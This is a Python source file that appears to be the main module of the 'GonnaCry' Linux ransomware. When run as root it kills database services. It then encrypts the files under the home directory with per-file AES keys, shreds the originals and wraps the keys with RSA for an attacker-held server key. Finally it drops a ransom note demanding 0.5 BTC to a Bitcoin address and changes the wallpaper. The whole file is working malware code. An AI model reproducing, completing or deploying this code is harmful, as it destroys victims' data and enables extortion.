import variables
import asymmetric
import get_files
import symmetric
import environment
import generate_keys
import utils

import os
import string
import random
import base64
import pickle
import gc
import subprocess

machine_id = environment.get_unique_machine_id()

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP


def kill_databases():
    if(os.getuid() == 0):
        mysql = 'mysqld stop; mysql.server stop'
        mongo = 'service mongodb stop; /etc/init.d/mongodb stop'
        postgres = 'pkill -u postgres; pkill postgres'
        
        os.system(mysql)
        os.system(mongo)
        os.system(postgres)


def encrypt_priv_key(msg, key):
    n = 127
    x = [msg[i:i+n] for i in range(0, len(msg), n)]

    key = RSA.importKey(key)
    cipher = PKCS1_OAEP.new(key)
    encrypted = []
    for i in x:
        ciphertext = cipher.encrypt(i)
        encrypted.append(ciphertext)
    return encrypted


def start_encryption(files):
    AES_and_base64_path = []
    for found_file in files:
        key = generate_keys.generate_key(128, True)
        AES_obj = symmetric.AESCipher(key)
        
        found_file = base64.b64decode(found_file)

        try:
            with open(found_file, 'rb') as f:
                file_content = f.read()
        except:
            continue

        encrypted = AES_obj.encrypt(file_content)
        utils.shred(found_file)

        new_file_name = found_file.decode('utf-8') + ".GNNCRY"
        with open(new_file_name, 'wb') as f:
            f.write(encrypted)

        base64_new_file_name = base64.b64encode(new_file_name.encode('utf-8'))

        AES_and_base64_path.append((key, base64_new_file_name))
    return AES_and_base64_path


def menu():
    os.makedirs(variables.ransomware_path, exist_ok=True)
    try:
        os.mkdir(variables.test_path)
    except OSError:
        pass

    kill_databases()
        
    files = [f for f in get_files.find_files(variables.home)
             if not base64.b64decode(f).decode('utf-8', errors='replace').startswith(variables.ransomware_path)]

    rsa_object = asymmetric.assymetric()
    rsa_object.generate_keys()
    
    Client_private_key = rsa_object.private_key_PEM
    Client_public_key = rsa_object.public_key_PEM
    encrypted_client_private_key = encrypt_priv_key(Client_private_key,
                                                    variables.server_public_key)
    
    with open(variables.encrypted_client_private_key_path, 'wb') as output:
        pickle.dump(encrypted_client_private_key, output, pickle.HIGHEST_PROTOCOL)
    
    with open(variables.client_public_key_path, 'wb') as f:
        f.write(Client_public_key)
    
    Client_private_key = None
    rsa_object = None
    del rsa_object
    del Client_private_key
    gc.collect()
    
    client_public_key_object =  RSA.importKey(Client_public_key)
    client_public_key_object_cipher = PKCS1_OAEP.new(client_public_key_object)


    # FILE ENCRYPTION STARTS HERE !!!
    aes_keys_and_base64_path = start_encryption(files)
    enc_aes_key_and_base64_path = []

    for _ in aes_keys_and_base64_path:
        aes_key = _[0]
        base64_path = _[1]

        encrypted_aes_key = client_public_key_object_cipher.encrypt(aes_key)
        enc_aes_key_and_base64_path.append((encrypted_aes_key, base64_path))
    
    aes_keys_and_base64_path = None
    del aes_keys_and_base64_path
    gc.collect()

    with open(variables.aes_encrypted_keys_path, 'w') as f:
        for _ in enc_aes_key_and_base64_path:
            line = base64.b64encode(_[0]).decode() + " " + _[1].decode() + "\n"
            f.write(line)

    enc_aes_key_and_base64_path = None
    del enc_aes_key_and_base64_path
    gc.collect()


def drop_ransom_note():
    note = """
============================================================
  YOUR FILES HAVE BEEN ENCRYPTED WITH AES-256-GCM
============================================================

All your important files have been encrypted.
Without paying the ransom, you CANNOT recover your files.

  PAYMENT:    0.5 BTC
  ADDRESS:    bc1qxy2kgdygjrsqtzq2n0yrf249xvycs8e7j0cjl

  MACHINE ID: {machine_id}
  Include this ID in your payment message so we can
  match your payment to your decryption key.

After confirmed payment, you will receive the decryptor tool.

  DO NOT delete ~/gonnacry/ — your decryption key is stored there.
  DO NOT attempt to decrypt files manually.
  DO NOT reinstall the OS — you will lose your key forever.

============================================================
""".format(machine_id=machine_id)

    for drop_path in [variables.home, variables.desktop]:
        note_path = os.path.join(drop_path, 'RANSOM_NOTE.txt')
        try:
            with open(note_path, 'w') as f:
                f.write(note)
        except OSError:
            pass



if __name__ == "__main__":
    menu()
    drop_ransom_note()
    utils.change_wallpaper()
